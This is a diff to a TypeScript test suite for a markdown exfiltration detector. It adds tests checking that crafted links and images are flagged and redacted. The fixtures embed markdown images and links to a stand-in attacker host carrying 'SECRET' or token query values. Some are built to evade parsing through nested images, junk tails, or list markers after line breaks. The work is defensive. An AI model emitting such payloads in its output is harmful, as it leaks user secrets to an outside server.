@@ -3354,11 +3354,6 @@ const REGEX_READERS: Record<string, { crosses: boolean; verdict: Verdict; why: s
     verdict: "cannot-cross",
     why: "two literal characters, an optional `!` and a `[` — no class, no escape, nothing that admits a terminator",
   },
-  INLINE_DESTINATION: {
-    crosses: true,
-    verdict: "consumes-markers",
-    why: "T93#A — the leading run is `skipDestinationLeadingWhitespace`, the same helper T90 gave the definition destination; the bare alternative `[^)\\s]+` cannot cross, `[^)]*` is the title span and is never classified, and the angle alternative `[^<>\\n]` ends the destination at LF exactly as CommonMark does",
-  },
   REFERENCE_DESTINATION: {
     crosses: true,
     verdict: "consumes-markers",
@@ -3419,6 +3414,21 @@ const SCAN_SITES: Record<string, { count: number; verdict: Verdict | "definition
     count: 1,
     verdict: "consumes-markers",
     why: "T90 `skipDestinationLeadingWhitespace` — crosses, then calls `skipBlockContainerPrefix`",
+  },
+  "if (code === 0x29 || isCollapsibleSpace(code, content[at] as string)) break;": {
+    count: 1,
+    verdict: "cannot-cross",
+    why: "slice-34 `classificationHeadEnd` — the classified inline head ends at any whitespace, terminators included",
+  },
+  "if (code <= 0x20 || code === 0x7f || isCollapsibleSpace(code, content[at] as string)) {": {
+    count: 1,
+    verdict: "cannot-cross",
+    why: "slice-34 `bareDestinationEnd` — a bare destination ends at any space or control character, terminators included",
+  },
+  "if (LINE_TERMINATORS.has(code)) return false;": {
+    count: 1,
+    verdict: "cannot-cross",
+    why: "slice-34 `resolvesAsInline` — a title that reaches a terminator is not called resolved, so the cursor never skips across one",
   },
   "if (isCollapsibleSpace(code, content[at] as string)) {": {
     count: 1,
@@ -3560,4 +3570,136 @@ test("T93 GUARD: a container-stripped view of a document never finds what the do
   }
   expect(examined).toBeGreaterThan(100); // the corpus must not be vacuous
   expect(leaks).toEqual([]);
+});
+
+// ---------------------------------------------------------------------------
+// Perimeter review, slice 34. The inline destination reader accepted ANY text
+// between the destination and the first `)` (`[^)]*`), so a construct a
+// renderer rejects still moved the scan cursor past an image nested in that
+// text (logic F-001); its leading skip crossed a line into an ordered-list
+// marker whose `)` was the only one the "is there a `)`" guard had seen
+// (backend F-002); and the tail scan re-ran to the same far `)` for every
+// description end that did not move the cursor (performance F-001, highload
+// F-001). Every bypass below was traced against `marked`.
+// ---------------------------------------------------------------------------
+
+test("slice-34 logic F-001: an image nested in a destination's rejected tail is a finding", () => {
+  const U = `https://${ATTACKER}/p?d=SECRET`;
+  const bypasses: Record<string, string> = {
+    linkOuter: `[a](https://x.example.org/ ![i](${U}))`,
+    imageOuter: `![a](x ![i](${U}))`,
+    titleThenJunk: `[a](x "t" ![i](${U}))`,
+    angleThenJunk: `[a](<https://ok.example.org/> ![i](${U}))`,
+    unbalancedParenInHead: `[a](x(![i](${U})`,
+    referenceImageInJunk: `[a](x ![i][ref])\n\n[ref]: ${U}\n`,
+  };
+  for (const [id, content] of Object.entries(bypasses)) {
+    const matches = detectExfil(content, []);
+    expect(`${id}:${matches.some((match) => match.value.includes(ATTACKER))}`).toBe(
+      `${id}:true`,
+    );
+    expect(`${id}:${applyRedaction(content, matches).includes(ATTACKER)}`).toBe(
+      `${id}:false`,
+    );
+  }
+});
+
+test("slice-34 logic F-001: constructs a renderer resolves keep today's verdicts", () => {
+  const clean: Record<string, string> = {
+    plainLink: "[docs](https://ok.example.org/docs)",
+    titledLink: '[docs](https://ok.example.org/docs "Docs")',
+    singleQuotedTitle: "[docs](https://ok.example.org/docs 'Docs' )",
+    parenTitle: "[docs](https://ok.example.org/docs (Docs))",
+    balancedParens: "[wiki](https://ok.example.org/wiki/Foo_(bar)) text",
+    angleLink: "[a](<https://ok.example.org/a b>)",
+    // the whole `![x](…)` is the outer link's DESTINATION, not markdown
+    imageShapedDestination: `[a](http://h.example.org/![x](https://${ATTACKER}/p))`,
+  };
+  for (const [id, content] of Object.entries(clean)) {
+    expect(`${id}:${detectExfil(content, []).length}`).toBe(`${id}:0`);
+  }
+  const U = `https://${ATTACKER}/p.png`;
+  const flagged: Record<string, [string, string]> = {
+    titledImage: [`![logo](${U} "Logo")`, U],
+    sensitiveLink: [
+      "[k](https://ok.example.org/?token=SECRET)",
+      "https://ok.example.org/?token=SECRET",
+    ],
+  };
+  for (const [id, [content, url]] of Object.entries(flagged)) {
+    const matches = detectExfil(content, []);
+    expect(`${id}:${matches.map((match) => `${match.start}:${match.value}`)}`).toBe(
+      `${id}:${content.indexOf(url)}:${url}`,
+    );
+  }
+});
+
+test("slice-34 backend F-002: an ordered-list marker after a line ending is not the destination's close", () => {
+  const U = `https://${ATTACKER}/?d=SECRET`;
+  const bypasses: Record<string, string> = {
+    emptyDestinationThenList: `![a](\n1) ![x](${U})`,
+    linkDestinationThenList: `[a](https://ok.example.org/\n1) ![x](${U})`,
+    linkDestinationThenListLink: `[a](https://ok.example.org/\n1) [x](https://${ATTACKER}/?token=SECRET)`,
+  };
+  for (const [id, content] of Object.entries(bypasses)) {
+    const matches = detectExfil(content, []);
+    expect(`${id}:${matches.some((match) => match.value.includes(ATTACKER))}`).toBe(
+      `${id}:true`,
+    );
+  }
+  // A legitimate link before a list is unchanged, with and without a finding.
+  expect(detectExfil("[docs](https://ok.example.org/docs)\n1) one\n2) two", []).length).toBe(0);
+  const sensitive = "[k](https://ok.example.org/?token=SECRET)";
+  const alone = detectExfil(sensitive, []);
+  const beforeList = detectExfil(`${sensitive}\n1) one\n2) two`, []);
+  expect(beforeList.map((match) => [match.start, match.end, match.policyId])).toEqual(
+    alone.map((match) => [match.start, match.end, match.policyId]),
+  );
+  expect(alone.length).toBe(1);
+});
+
+test("slice-34 backend F-003: an entity-escaped credential locator in a link is a finding", () => {
+  const content = `[x](https://${ATTACKER}/?a=1&amp;token=SECRET)`;
+  const matches = detectExfil(content, []);
+  expect(matches.map((match) => match.policyId)).toEqual([
+    "egress.markdown-link-sensitive-value",
+  ]);
+  expect(applyRedaction(content, matches)).not.toContain("SECRET");
+  expect(detectExfil(`[x](https://${ATTACKER}/?a=1&amp;b=2)`, []).length).toBe(0);
+});
+
+test("slice-34 performance F-002: text with no bracket and no tag is not scanned", () => {
+  const plain = "word ".repeat(400000) + "1. item\n> quote\n- bullet\n";
+  const started = performance.now();
+  expect(detectExfil(plain, []).length).toBe(0);
+  expect(performance.now() - started).toBeLessThan(10);
+});
+
+test("slice-34 performance F-001 / highload F-001 / backend F-002: the inline destination reader stays linear", () => {
+  const BUDGET_MS = 250;
+  const shapes: Record<string, string> = {
+    // backend F-002: the guard's only `)` is the list marker the skip consumed
+    listMarkerThenRun: "![a](\n1) " + "A".repeat(200000),
+    // performance F-001: an empty `<>` destination never moved the cursor
+    emptyAngleRun: "[](<>\n".repeat(30000) + ")",
+    emptyAngleNoNewline: "[a](<>".repeat(30000) + ")",
+    unterminatedBare: "[a](" + "A".repeat(200000),
+    openParenRun: "[a](".repeat(50000),
+    openParenRunClosed: "[a](".repeat(30000) + ")",
+    junkTailRun: "[a](x y".repeat(30000) + ")",
+    titleOpenRun: '[a](x "'.repeat(30000) + ")",
+    // highload F-001: escape-aware-only constructs never move the cursor
+    escapedImageRun: "![a\\]](".repeat(30000) + ")",
+    escapedLinkRun: "[a\\]](".repeat(30000) + ")",
+    escapedImageNest: "![a\\]](".repeat(20000) + ")".repeat(20000),
+    escapedLinkNest: "[a\\]](".repeat(20000) + ")".repeat(20000),
+  };
+  const slow: string[] = [];
+  for (const [id, text] of Object.entries(shapes)) {
+    const started = performance.now();
+    detectExfil(text, []);
+    const elapsed = performance.now() - started;
+    if (elapsed >= BUDGET_MS) slow.push(`${id}=${elapsed.toFixed(1)}ms`);
+  }
+  expect(slow).toEqual([]);
 });
